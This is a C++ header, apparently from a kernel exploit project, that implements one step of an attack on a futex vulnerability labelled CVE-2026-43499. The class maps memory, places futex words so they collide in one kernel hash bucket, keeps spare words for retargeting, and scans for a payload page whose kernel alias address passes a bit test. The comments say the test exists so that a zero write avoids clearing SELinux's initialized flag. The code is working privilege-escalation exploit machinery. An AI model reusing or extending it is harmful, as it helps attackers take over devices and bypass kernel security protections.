#pragma once
/** @file backend/cve_2026_43499/steps/words_region.hpp
 *  两个 futex 字的**承载者**：映射一块小区域、按同一个桶摆好字、把指针借给调用方。
 *
 *  为什么单独成单元：字要活过「准备」那一段（准备的映射随它返回就没了），而窗口三步在之后才用它们
 *  ⇒ 归属必须在**调用方**这一层。这里只负责映射与摆放，桶的判据仍来自调用方给的适配器。
 *
 *  设备专用（映射走 snitch landing）。
 */
#include <cstddef>
#include <cstdio>
#include <cstdint>

#include "backend/cve_2026_43499/leak/collision_buckets.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** One mapped region holding the cohort's words, placed so that they share a futex bucket. */
    class WordsRegion final {
      public:
        WordsRegion() noexcept = default;
        WordsRegion(const WordsRegion &) = delete;
        WordsRegion &operator=(const WordsRegion &) = delete;
        ~WordsRegion() noexcept;

        /** Map @p bytes and place @p count words in one bucket (the rule requires agreement).
         *  @return true when every word is placed; false when the region could not be mapped or
         *  the area was too small to find matching positions. */
        [[nodiscard]] bool place(std::size_t count, leak::CollisionBuckets &buckets) noexcept;
        /** Give the mapping back (idempotent). */
        void close() noexcept;

        [[nodiscard]] std::uint32_t *word(std::size_t index) const noexcept {
            return index < placed_ ? words_[index] : nullptr;
        }
        [[nodiscard]] std::size_t count() const noexcept { return placed_; }
        /** 载荷页：与两个字同一块映射（同一套归属规则——它也要活过准备那一段）。 */
        [[nodiscard]] std::uint8_t *payload() const noexcept {
            if (region_ == nullptr) { return nullptr; }
            return static_cast<std::uint8_t *>(region_) + kPayloadBaseBytes;
        }
        /** 载荷页：**满足本树判据**的那一页 —— 零写 + preserve_child 时判据要求
         *  ((page + 0x100) >> 16) & 1 == 1（否则会清掉 selinux_state 的 initialized 位）。
         *  区内按 64 KiB 扫描，返回满足要求的那一页；没有就 nullptr（由调用方具名拒绝）。 */
        /** 挑出满足本树判据的那一页。**判据吃的是内核侧地址**（payload_base = alias_delta + page），
         *  所以扫描必须带 alias_delta，按内核侧地址判奇偶。 */
        [[nodiscard]] std::uint8_t *payload_for_zero_write(std::uint64_t alias_delta) noexcept {
            if (payload_region_ == nullptr) {
                return nullptr;
            }
            auto *base = static_cast<std::uint8_t *>(payload_region_);
            for (std::size_t at = 0U; at + kPayloadAreaBytes <= kPayloadRegionBytes; at += 0x10000U) {
                const auto address = alias_delta + reinterpret_cast<std::uint64_t>(base + at) + 0x100U;
                if (((address >> 16U) & 1U) == 1U) {
                    return base + at;
                }
            }
            return nullptr;
        }
        /** 载荷映射的长度与其中一块页的大小（1 MiB ⇒ 16 个 64 KiB 候选 ⇒ 必有合格者）。 */
        static constexpr std::size_t kPayloadRegionBytes = 1024U * 1024U;
        static constexpr std::size_t kPayloadAreaBytes = 0x4000U;
        /** 载荷区在区内的偏移（别名换算要用：alias_delta = 泄漏地址 - (基地址 + 这个)）。 */
        [[nodiscard]] static constexpr std::size_t kPayloadOffset() noexcept { return kPayloadBaseBytes; }
        /** 区内任意地址的绝对基址：算绝对指针要用它。 */
        [[nodiscard]] std::uint64_t base() const noexcept {
            return reinterpret_cast<std::uint64_t>(region_);
        }

        /** 区内**没被选中**的字：队列只锤被摆好的那几个，所以这是干净的——改挂目标要用它。 */
        [[nodiscard]] std::uint32_t *spare(std::size_t index) const noexcept {
            if (region_ == nullptr || index >= 4U) { return nullptr; }
            auto *base = static_cast<unsigned char *>(region_);
            return reinterpret_cast<std::uint32_t *>(base + kSpareBaseBytes + (index * sizeof(std::uint32_t)));
        }

        [[nodiscard]] std::uint64_t address(std::size_t index) const noexcept {
            return index < placed_ ? addresses_[index] : 0U;
        }

      private:
        /** 备用字从区的中段起（离被选中的字足够远，读起来也一眼看得出不是同一批）。 */
        static constexpr std::size_t kSpareBaseBytes = 32U * 1024U;
        /** 载荷页从 48 KiB 起：离字与备用字都远，改起来不打架。 */
        static constexpr std::size_t kPayloadBaseBytes = 48U * 1024U;
        /** 区的总长：128 KiB（给载荷页留两个 64 KiB 候选，好挑满足判据的那个）。 */
        static constexpr std::size_t kRegionBytes = 128U * 1024U;
        void *region_ = nullptr;
        /** 载荷专用映射（1 MiB，为 64 KiB 粒度上的奇偶挑选留足候选）。 */
        void *payload_region_ = nullptr;
        std::uint32_t *words_[4] = {};
        std::uint64_t addresses_[4] = {};
        std::size_t placed_ = 0U;
    };
}  // namespace ghostlock::backend::cve_2026_43499::steps
